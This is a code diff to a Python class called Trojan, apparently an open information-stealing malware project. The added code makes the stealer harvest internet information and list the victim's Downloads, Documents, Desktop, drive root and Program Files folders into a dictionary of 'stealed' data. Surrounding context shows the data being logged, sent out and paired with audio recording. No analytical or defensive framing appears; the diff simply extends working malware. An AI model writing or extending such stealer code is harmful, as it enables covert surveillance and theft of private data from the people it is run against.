@@ -307,6 +307,12 @@ class Trojan:
         # Steal all computer information.
         self.stealer_grab_computer_information()
 
+        # Steal all internet information.
+        self.stealer_grab_internet_information()
+
+        # Stealing all directories information.
+        self.stealer_grab_directories_information()
+
         # Creating an log file.
         self.stealer_create_log()
 
@@ -318,6 +324,26 @@ class Trojan:
 
             # Sending information.
             self.stealer_send_information()
+
+    def stealer_grab_directories_information(self) -> None:
+        """
+        Steals all information about directories.
+        :return: [None] Not returns any.
+        """
+
+        # Getting user profile.
+        userprofile = os.getenv("userprofile")
+
+        # Getting drive path.
+        drive = os.getcwd().split("\\")[0]
+
+        # Adding Directories.
+        self.__stealed_information["Directory_Downloads"] = os.listdir(userprofile + "\\Downloads")
+        self.__stealed_information["Directory_Documents"] = os.listdir(userprofile + "\\Documents")
+        self.__stealed_information["Directory_Desktop"] = os.listdir(userprofile + "\\Desktop")
+        self.__stealed_information["Directory_Windows"] = os.listdir(drive + "\\")
+        self.__stealed_information["Directory_ProgramFiles"] = os.listdir(drive + "\\Program Files")
+        self.__stealed_information["Directory_ProgramFiles86"] = os.listdir(drive + "\\Program Files (x86)")
 
     def stealer_send_information(self) -> None:
         """
@@ -716,7 +742,7 @@ class Trojan:
         file.writeframes(b''.join(frames))
         file.close()
 
-    def try_import_loguru(self):
+    def try_import_loguru(self) -> None:
         """
         Trying to import loguru in system.
         :return: [None] Not returns anything.
